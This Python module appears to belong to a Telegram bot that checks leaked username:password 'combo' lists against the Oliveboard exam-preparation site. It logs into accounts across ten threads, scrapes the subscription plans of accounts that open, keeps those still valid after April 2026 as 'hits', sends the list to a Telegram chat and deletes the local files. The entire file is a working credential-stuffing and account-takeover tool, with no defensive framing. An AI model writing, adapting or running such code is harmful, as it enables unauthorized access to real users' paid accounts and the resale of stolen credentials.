import requests
import os
import threading
import re
import time
from datetime import datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from functools import partial

# --- CONFIG ---
MAX_THREADS = 10 
CUTOFF_DATE = datetime(2026, 4, 1)

print_lock = threading.Lock()
progress_lock = threading.Lock()

def is_date_valid(text_block):
    matches = re.findall(
        r'\[(January|February|March|April|May|June|July|August|September|October|November|December)\s+(\d{1,2}),\s+(20\d{2})\]',
        text_block,
        re.IGNORECASE
    )
    for month, day, year in matches:
        try:
            dt = datetime.strptime(f"{month} {day} {year}", "%B %d %Y")
            if dt >= CUTOFF_DATE:
                return True
        except:
            pass
    return False

def check_account(line, bot, chat_id, hits_list, state, total_lines):
    parts = line.split(':')
    if len(parts) < 2:
        with print_lock:
            state['checked'] += 1
        return
    
    p = parts[-1].strip()
    u = parts[-2].strip()
    if "/" in u:
        u = u.split("/")[-1]

    session = requests.Session()
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'referer': 'https://www.oliveboard.in/'
    }

    try:
        # Step 1: Login
        session.post('https://www.oliveboard.in/pyscripts/next.php', data={'email': u}, headers=headers, timeout=10)
        res = session.post('https://www.oliveboard.in/pyscripts/loginnext.php', 
                          data={'lemail': u, 'lpwd': p, 'lpwd1': '1'}, 
                          headers=headers, timeout=10)

        if "1" in res.text or "u1.oliveboard.in" in res.text:
            # Step 2: Validity Check
            val_res = session.get('https://www.oliveboard.in/myaccount/buypayu/validity.php?i=common', headers=headers, timeout=10)
            soup = BeautifulSoup(val_res.text, 'html.parser')
            table = soup.find('table')
            
            plans_list = []
            if table:
                rows = table.find_all('tr')[1:]
                for row in rows:
                    cols = row.find_all('td')
                    if len(cols) >= 4:
                        p_name = cols[2].text.strip()
                        expiry = cols[3].text.strip().replace('\n', ' ')
                        plan_entry = f"{p_name} | Exp: {expiry}"
                        plans_list.append(plan_entry)

            # Step 3: Result Handling
            with print_lock:
                if plans_list and is_date_valid(val_res.text):
                    state['hits'] += 1
                    state['checked'] += 1
                    
                    hit_text = f"🔥 HIT: {u}:{p}\n"
                    for plan in plans_list:
                        hit_text += f"   ∟ {plan}\n"
                    hit_text += "-" * 50 + "\n"
                    hits_list.append(hit_text)
                    
                    # Update progress (5 second rule)
                    update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines, state)
                else:
                    state['checked'] += 1
        else:
            with print_lock:
                state['checked'] += 1

    except Exception as e:
        with print_lock:
            state['checked'] += 1

def update_progress(bot, chat_id, msg_id, hits, checked, total, state):
    """Update progress only every 5 seconds"""
    current_time = time.time()
    
    # Check if 5 seconds have passed since last update
    if current_time - state.get('last_update', 0) >= 5:
        with progress_lock:
            # Double check inside lock
            if current_time - state.get('last_update', 0) >= 5:
                try:
                    if total > 0:
                        progress_percent = int((checked / total) * 10)
                        bar = "■" * progress_percent + "▢" * (10 - progress_percent)
                    else:
                        bar = "■■▢▢▢▢▢▢"
                    
                    progress_text = f"""╭───☀ 𝖢𝖤𝖢𝖪𝖨𝖭𝖦 ☀───╮
┣ ⚙️ {bar} 
┣ 📊 Hit : {hits}
┣ 📂 Loaded : {checked}/{total}
┣ 🔥 Status : Checking...
─── 𝐎𝐥𝐢𝐞𝐯𝐁𝐨𝐚𝐫𝐝 𝐁𝐨𝐭 𖤓───╯"""
                    
                    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=progress_text)
                    state['last_update'] = current_time
                except:
                    pass

def run_check(bot, chat_id, progress_msg_id, combo_file, platform_name="Olievboard"):
    hits_list = []
    
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f.readlines() if l.strip()]

    total_lines = len(lines)
    state = {'hits': 0, 'checked': 0, 'msg_id': progress_msg_id, 'last_update': 0}
    
    func = partial(check_account, bot=bot, chat_id=chat_id, hits_list=hits_list, state=state, total_lines=total_lines)
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(func, lines)

    # Final .txt file chat me bhejna
    final_filename = "olievhit.txt"
    if hits_list and state['hits'] > 0:
        with open(final_filename, "w", encoding="utf-8") as f:
            for hit in hits_list:
                f.write(hit)

        time.sleep(2)
        try:
            with open(final_filename, "rb") as f:
                bot.send_document(chat_id, f, caption=f"✅ Valid Hits ({state['hits']})")
        except:
            pass
        
        # Local file delete karna
        if os.path.exists(final_filename):
            os.remove(final_filename)
    else:
        try:
            bot.send_message(chat_id, "❌ No valid hits found.")
        except:
            pass

    # Process Complete hone par Progress/Complete box ko DELETE kar dena
    try:
        bot.delete_message(chat_id, progress_msg_id)
    except:
        pass
        
    # Combo file delete karna
    if os.path.exists(combo_file):
        os.remove(combo_file)